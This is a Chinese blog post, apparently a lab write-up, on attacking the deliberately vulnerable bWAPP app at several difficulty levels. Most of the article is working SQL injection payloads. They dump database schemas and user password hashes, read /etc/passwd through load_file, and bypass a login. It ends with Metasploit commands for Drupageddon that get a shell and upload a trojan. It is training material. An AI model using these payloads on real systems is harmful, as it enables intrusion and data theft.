@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="bwapp玩法,bwapp靶机,web安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="refreshing18" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="SQL InjectionSQL Injection (GET/Search)1,在low级别下，首先对是否存在sql注入进行简单的判断，然后再加以利用，直接在输入框输入单引号发现如下报错  于是立刻判断存在sql注入，那么是什么类型的注入呢？SQL注入按照参数类型可以分为两种，字符型注入和数字型注入，那么字符型注入和数字型注入的区别在哪里呢？当发生注入点的参数为整型数据时，则称该注入为数字型注入">
+<meta name="keywords" content="bwapp玩法,bwapp靶机,web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bwapp玩法总结之二">
+<meta property="og:url" content="http://yoursite.com/2018/10/25/bwapp玩法总结之二/index.html">
+<meta property="og:site_name" content="refreshing18">
+<meta property="og:description" content="SQL InjectionSQL Injection (GET/Search)1,在low级别下，首先对是否存在sql注入进行简单的判断，然后再加以利用，直接在输入框输入单引号发现如下报错  于是立刻判断存在sql注入，那么是什么类型的注入呢？SQL注入按照参数类型可以分为两种，字符型注入和数字型注入，那么字符型注入和数字型注入的区别在哪里呢？当发生注入点的参数为整型数据时，则称该注入为数字型注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc3009278866.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc30dce442a3.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc32f4409ce5.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc331405c7f4.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc334047f890.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc33568f2724.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc337c7026f3.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc33afb20d3e.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/14/5bc33e1111c7e.png">
+<meta property="og:image" content="c:/Users/陈火山/AppData/Roaming/Typora/typora-user-images/1539677920972.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc7498b03f9c.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc74a99070ae.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc74bbe15325.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc74d2e23008.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc74faf10c19.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/17/5bc7589997585.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bce8b7578713.png">
+<meta property="og:image" content="https://i.loli.net/2018/10/23/5bce8cf0ef728.png">
+<meta property="og:updated_time" content="2018-10-25T08:07:38.008Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bwapp玩法总结之二">
+<meta name="twitter:description" content="SQL InjectionSQL Injection (GET/Search)1,在low级别下，首先对是否存在sql注入进行简单的判断，然后再加以利用，直接在输入框输入单引号发现如下报错  于是立刻判断存在sql注入，那么是什么类型的注入呢？SQL注入按照参数类型可以分为两种，字符型注入和数字型注入，那么字符型注入和数字型注入的区别在哪里呢？当发生注入点的参数为整型数据时，则称该注入为数字型注入">
+<meta name="twitter:image" content="https://i.loli.net/2018/10/14/5bc3009278866.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/25/bwapp玩法总结之二/"/>
+
+
+
+
+
+  <title>bwapp玩法总结之二 | refreshing18</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+	<a href="https://github.com/volcano18" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">refreshing18</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">及吾功成名就，携君陌上花开。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/bwapp玩法总结之二/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="volcano18">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/10/13/5bc17ca8d1eb7.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="refreshing18">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bwapp玩法总结之二</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-25T16:06:57+08:00">
+                2018-10-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bwapp/" itemprop="url" rel="index">
+                    <span itemprop="name">bwapp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/10/25/bwapp玩法总结之二/" class="leancloud_visitors" data-flag-title="bwapp玩法总结之二">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h2><p>1,在low级别下，首先对是否存在sql注入进行简单的判断，然后再加以利用，直接在输入框输入单引号发现如下报错</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc3009278866.png" alt="1539506113226"></p>
+<p>于是立刻判断存在sql注入，那么是什么类型的注入呢？SQL注入按照参数类型可以分为两种，字符型注入和数字型注入，那么字符型注入和数字型注入的区别在哪里呢？当发生注入点的参数为整型数据时，则称该注入为数字型注入，当注入点是字符串时，则称为字符型注入，字符型注入和数字型注入最大的区别就是字符型注入需要引号进行闭合，于是第二步就是判断该sql注入是字符型注入还是数字型注入：</p>
+<p>输入1 or 1=1– 没有查询到结果，而输入1’ or 1=1– 可以查询到结果，于是初步判断该注入为字符型注入，即接下来对该sql注入的利用均需要用使用引号闭合。（注意–后面有空格）</p>
+<p>查询到的结果如下：</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc30dce442a3.png" alt="volcano18"></p>
+<p>选取第二个Title对该查询语句进行判断，直接输入Iron点击Search，可以正确查询到第二行的内容，而输入Iron’%– 报错如下：</p>
+<p><code>Error: You have an error in your SQL syntax; check the manual that</code><br><code>corresponds to your MySQL server version for the right syntax to use</code><br><code>near &#39;%-- %&#39;&#39; at line 1</code></p>
+<p>而输入Iron%’– 依旧可以正确查询到第二行的内容，于是初步判断查询语句如下：</p>
+<p><code>select * from 表名 where Title like &#39;%&quot;.用户输入.&quot;%&#39;</code></p>
+<p>接着该对字段数进行判断了，使用语句order by</p>
+<p>Iron%’ order by 7–  可以正确显示第二行内容，而Iron%’ order by 8– 则报错</p>
+<p><code>Error: Unknown column &#39;8&#39; in &#39;order clause&#39;</code>  </p>
+<p>所以初步判断字段数为7。</p>
+<p>通过union select 进一步确定可以显示的字段。</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,2,3,4,5,6,7-- &amp;action=search</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc32f4409ce5.png" alt="volcano18"></p>
+<p>发现2,3,4,5字段可以显示。</p>
+<p>接着对mysql用户名主机名，当前数据库的版本信息，当前数据库名称，数据库路径等进行查询和显示。</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,user(),version(),database(),@@datadir,6,7-- &amp;action=search</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc331405c7f4.png" alt="1539518756466"></p>
+<p>因为mysql数据库的数据结构，所有的数据结构都存放在一张元数据表里面，表名为information_schema，所以我们可以通过这个直接查看相应的表名和库名。</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,table_name,table_schema,database(),@@datadir,6,7 from information_schema.tables-- &amp;action=search</code></p>
+<p>查看结果如下：</p>
+<p><img src="https://i.loli.net/2018/10/14/5bc334047f890.png" alt="1539519469662"></p>
+<p>接着查看当前数据库下面的表名：</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,table_name,table_schema,database(),@@datadir,6,7 from information_schema.tables where table_schema=database()-- &amp;action=search</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc33568f2724.png" alt="1539519815763"></p>
+<p>看到了users表，接着查看users表的字段名：</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,column_name,table_schema,database(),@@datadir,6,7 from information_schema.columns where table_name=&quot;users&quot;-- &amp;action=search</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc337c7026f3.png" alt="1539520434299"></p>
+<p>在users表中看到了login,password,admin等字段，接着对这些字段的内容进行查看。</p>
+<p><code>http://192.168.174.130/bWAPP/sqli_1.php?title=Iron%&#39; UNION SELECT 1,login,admin,password,@@datadir,6,7 from bWAPP.users-- &amp;action=search</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc33afb20d3e.png" alt="1539521253447"></p>
+<p>成功读取用户名和密码。但是密码却经过了md5加密，进行md5解密可以得到对应的用户名和密码分别为：</p>
+<p>A.I.M.              -               bug</p>
+<p>bee                 -               bug</p>
+<p>也可以对文件进行操作，比如读取文件：</p>
+<p><code>1%&#39; union select 1,load_file(&#39;/etc/passwd&#39;),3,4,5,6,7--</code></p>
+<p><img src="https://i.loli.net/2018/10/14/5bc33e1111c7e.png" alt="1539522042877"> </p>
+<p>像这种对用户的输入没有进行任何过滤的，使用sqlmap直接跑就可以很快查出结果了。</p>
+<p>2，在medium级别下，没有能成功注入；sqli_check1</p>
+<p>3，在high级别下，没有成功注入。sqli_check2</p>
+<p><img src="C:\Users\陈火山\AppData\Roaming\Typora\typora-user-images\1539677920972.png" alt="1539677920972"></p>
+<h2 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h2><p>1，在low级别下</p>
+<p>第一步，判断是否存在sql注入，直接输入单引号‘，发现返回了sql的语法报错，那就很可能存在sql注入了</p>
+<p>第二步，判断是数字型注入还行字符型注入，发现将movie的值设置为1 and 1=1时，正确显示所查询的数据，但是将movie的值设置为1 and 1=2时，并没有正确回显。故初步判断为数字型注入。</p>
+<p>第三步，直接-1 order by 判断字段数，判断结果为有7个字段。判断方法与上面的sql injection(get/search)类似，所以就不再多说了。</p>
+<p>第四步，-1 union select 1,2,3,4,5,6,7判断可以回显的字段数，发现2,3,4,5字段可以正确回显。</p>
+<p>第五步，查询自己想要的数据吧，方法与上面的sql injection(get/search)类似。</p>
+<p>2，在medium级别下，仅仅使用addslashes函数对单引号，双引号，反斜杠和NULL使用反斜杠进行了转义，不使用单引号和双引号就好了嘛，照样注入：注入方法类似上述步骤，我将部分注入代码列出，本人不在赘述。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 order by 7--</span><br><span class="line">-1 union select 1,2,3,4,5,6,7--</span><br><span class="line">-1 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata limit 1,1--</span><br><span class="line">-1 union select 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata--</span><br><span class="line">-1 union select 1,group_concat(table_schema),3,4,5,6,7 from information_schema.tables--</span><br></pre></td></tr></table></figure>
+<p>information_schema中的一些表的基本特征：</p>
+<p><a href="https://blog.csdn.net/ahg1001/article/details/6749628" target="_blank" rel="noopener">https://blog.csdn.net/ahg1001/article/details/6749628</a></p>
+<p>3，在high级别下，没有注入成功。</p>
+<h2 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h2><p>与get注入方法一样，只是变成了post类型。</p>
+<h2 id="SQL-Injection-POST-Select"><a href="#SQL-Injection-POST-Select" class="headerlink" title="SQL Injection (POST/Select)"></a>SQL Injection (POST/Select)</h2><p>与get注入方法一样，只是变成了post类型。</p>
+<h2 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h2><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。</p>
+<p>首先输入了单引号‘，但是没有发现报错，郁闷了一会儿，于是看了看标题，原来是通过AJAX传送少量数据的，可能报错并没有被传回前端，不就是查询嘛，那就查询吧。</p>
+<p>输入百分号%，于是全部查出。</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc7498b03f9c.png" alt="volcano18"></p>
+<p>虽然在界面上没有明显的报错，但是输入单引号时在burp suite中却有明显的报错返回：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc74a99070ae.png" alt="volcano18"></p>
+<p>由于是查询，所以进一步猜测sql语句为：</p>
+<p><code>select * from 表名 where Title like &#39;%&quot;.用户输入.&quot;%&#39;</code></p>
+<p>于是构造sql语句如下：    Iron%’ or ‘%’=’</p>
+<p>成功查询：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc74bbe15325.png" alt="volcano18"></p>
+<p>本来是想使用查询语句:    Iron%’ or 1=1– ，但是我发现在这里注释失去了作用，于是便使用了上述的查询语句。</p>
+<p>接着继续查询：Iron%’ union select 1,2,3,4,5,6,7 and ‘%‘=’</p>
+<p>发现2,3,4,5可以回显。</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc74d2e23008.png" alt="3"></p>
+<p>于是可以依照sql injection(get/search)中类似的方法继续查询，在这里就只列出几条查询的结果：</p>
+<p>使用如下语句查询所有的库和对应的表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iron%&apos; union select 1,database(),table_name,table_schema,5,6,7 from information_schema.tables-- and &apos;%‘=’</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2018/10/17/5bc74faf10c19.png" alt="3"></p>
+<p>查询users表中的字段名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Iron%&apos; union select 1,column_name,table_name,database(),5,6,7 from information_schema.columns where table_name=&quot;users&quot;-- and &apos;%‘=’</span><br></pre></td></tr></table></figure>
+<p>剩下的不查了。</p>
+<p>2，在medium级别下，和high级别下，并没有查询出结果来。</p>
+<h2 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection(CAPTCHA)"></a>SQL Injection(CAPTCHA)</h2><p>与sql injection(get/search)相同的查询方法。</p>
+<p>在这里我就直接查询用户名和密码了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.174.130/bWAPP/sqli_9.php?title=Iron%&apos; UNION SELECT 1,login,admin,password,@@datadir,6,7 from bWAPP.users-- +&amp;action=search</span><br></pre></td></tr></table></figure>
+<h2 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h2><p>在low级别下，使用万能密码直接登录：</p>
+<p>用户名：volcano’ or ‘1’=’1’–   密码随便输入。</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc7589997585.png" alt="3"></p>
+<p>除了可以使用万能密码登录之外，也可以直接在这里进行查询：直接列出一些查询语句了，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; order by 4-- </span><br><span class="line"></span><br><span class="line">admin&apos; union select 1,2,3,4-- </span><br><span class="line"></span><br><span class="line">admin&apos; union select 1,version(),3,4-- </span><br><span class="line"></span><br><span class="line">admin&apos; union select 1,group_concat(table_schema),3,4 from information_schema.tables-- </span><br><span class="line"></span><br><span class="line">admin&apos; union select 1,group_concat(table_schema),3,group_concat(table_name) from information_schema.tables--</span><br></pre></td></tr></table></figure>
+<p>2，在medium级别下，没有成功注入。各个感觉addslashes函数对字符型注入的影响蛮大的，好像这里宽字节注入也不行。</p>
+<p>3，在high级别下，没有成功注入。</p>
+<h2 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection(Login Form/User)"></a>SQL Injection(Login Form/User)</h2><p>在low级别下，也可以采用上述SQL Injection (Login Form/Hero)中的方法进行注入，本人不在赘述，直接将按照我上述步骤的部分代码列出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&apos; order by 9</span><br><span class="line">这里应该时基于报错的注入，自己可以试试吧。</span><br></pre></td></tr></table></figure>
+<h2 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection(SQLite)"></a>SQL Injection(SQLite)</h2><p>注入方法类型上述的sql注入，我就不再多介绍了。直接注入吧。</p>
+<p>有六列 Iron’ order by 6– </p>
+<p>查看回显Iron’ union select 1,2,3,4,5,6– </p>
+<p>查看版本Iron’ union select 1,sqlite_version(),3,4,5,6– </p>
+<p>查看数据库Iron’ union select 1,sqlite_version(),name,4,5,6 from sqlite_master–+</p>
+<p>查询列名Iron’ union select 1,sqlite_version(),name,tbl_name,sql,6 from sqlite_master where name=”users”–+</p>
+<p>sqlite_master表和mysql数据库中系统表information_schema不一样的是，sqlite_master不存在类似“ column_name”的字段，但是她有一个sql字段，该字段保存了各个表的结构，包括表名，字段名和类型 。因此可以通过查询sql字段获取各个表的列名 </p>
+<p>‘union select 1,2,login||”:”||password,4,5,6 from users– </p>
+<h2 id="Drupal-SQL-Injection-Drupageddon"><a href="#Drupal-SQL-Injection-Drupageddon" class="headerlink" title="Drupal SQL Injection (Drupageddon)"></a>Drupal SQL Injection (Drupageddon)</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704" target="_blank" rel="noopener">CVE-2014-3704</a>直接使用msf进行攻击吧，毕竟时cve</p>
+<p>使用方法如下：</p>
+<p>use exploit/multi/按tab键进行自动查找。</p>
+<p>use exploit/multi/http/drupal_drupageddon</p>
+<p>set targeturi /drupal/</p>
+<p>set RHOST 192.168.174.130</p>
+<p>set rport 80</p>
+<p>exploit</p>
+<p>直接拿到shell啦。</p>
+<p><img src="https://i.loli.net/2018/10/23/5bce8b7578713.png" alt="volcano18"></p>
+<p>上传木马</p>
+<p><img src="https://i.loli.net/2018/10/23/5bce8cf0ef728.png" alt="1"></p>
+<p>成功上传。也可以进行其他的各种操作哦。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+	<div>
+	  
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>你的每一次肯定都是我不断进步和分享的动力</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="https://i.loli.net/2018/10/13/5bc1af59aeeb0.png" alt="volcano18 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://i.loli.net/2018/10/13/5bc1ada43fc3e.png" alt="volcano18 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bwapp玩法/" rel="tag"><i class="fa fa-tag"></i> bwapp玩法</a>
+          
+            <a href="/tags/bwapp靶机/" rel="tag"><i class="fa fa-tag"></i> bwapp靶机</a>
+          
+            <a href="/tags/web安全/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/20/matlab的数据操作/" rel="next" title="matlab的数据操作和线性规划">
+                <i class="fa fa-chevron-left"></i> matlab的数据操作和线性规划
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/10/13/5bc17ca8d1eb7.jpg"
